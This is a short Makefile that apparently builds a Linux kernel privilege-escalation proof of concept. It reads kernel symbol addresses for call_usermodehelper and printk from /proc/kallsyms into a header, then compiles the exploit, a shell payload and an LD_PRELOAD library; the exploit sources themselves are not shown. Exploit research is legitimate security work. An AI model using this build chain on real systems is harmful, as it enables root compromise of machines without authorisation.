SYMLIST = call_usermodehelper|printk

.PHONY: all
all: poc.c shell.c shell_preload.c
	sudo grep -w -E '($(SYMLIST))' /proc/kallsyms | awk '{printf("#define X_%s 0x%s\n", $$3, $$1)}' >poc.h
	echo "#define SHELL \"$(CURDIR)/shell\"" >>poc.h
	echo "#define LD_PRELOAD_SHELL \"LD_PRELOAD=$(CURDIR)/shell_preload.so\"" >>poc.h
	gcc poc.c -o poc
	gcc shell.c -o shell
	gcc -shared -fPIC -o shell_preload.so shell_preload.c

.PHONY: clean
clean:
	rm -f poc shell shell_preload.so poc.h
